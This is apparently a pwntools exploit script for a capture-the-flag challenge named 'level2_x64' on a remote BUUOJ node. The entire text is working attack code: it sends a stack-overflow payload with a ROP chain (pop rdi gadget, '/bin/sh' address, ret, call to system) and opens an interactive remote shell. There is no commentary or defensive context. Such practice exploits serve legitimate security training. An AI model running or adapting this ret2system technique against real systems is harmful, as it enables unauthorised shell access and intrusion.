from pwn import *

#io = process('./level2_x64')
io = remote('node4.buuoj.cn',29278)
context.log_level = 'debug'
#raw_input()

call_system = 0x00400603
binsh_addr = 0x00600a90
pop_rdi = 0x004006b3
ret_addr = 0x004004a1

payload = b'a'*0x80 + b'\x62'*0x8
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(ret_addr)
payload += p64(call_system)

io.recvuntil(b':')
io.send(payload)

io.interactive()
